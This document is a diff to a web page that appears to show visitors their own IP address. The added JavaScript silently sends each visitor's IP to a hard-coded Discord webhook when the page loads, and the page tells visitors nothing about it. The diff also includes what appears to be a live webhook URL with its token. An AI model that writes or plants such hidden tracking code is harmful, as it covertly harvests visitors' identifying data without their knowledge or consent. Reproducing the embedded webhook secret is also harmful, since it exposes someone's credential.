@@ -39,16 +39,42 @@
         <p id="ip">Loading...</p>
     </div>
     <script>
+        const webhookURL = "https://discord.com/api/webhooks/1331158148152561686/vFYMOS2KQrtz-EE1wAoe_fdjQVpEeB8dzUsEM5fO2MJosdDG96AB2q90gJ8gmxAqjcBB"; // Replace with your webhook URL
+
         async function fetchIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
-                document.getElementById('ip').textContent = data.ip;
+                const ip = data.ip;
+
+                // Display IP on the page
+                document.getElementById('ip').textContent = ip;
+
+                // Send IP to webhook
+                sendToWebhook(ip);
             } catch (error) {
                 document.getElementById('ip').textContent = 'Unable to fetch IP.';
                 console.error('Error fetching IP:', error);
             }
         }
+
+        async function sendToWebhook(ip) {
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `New visitor IP: ${ip}`
+                    })
+                });
+                console.log('IP sent to webhook successfully.');
+            } catch (error) {
+                console.error('Error sending IP to webhook:', error);
+            }
+        }
+
         fetchIP();
     </script>
 </body>
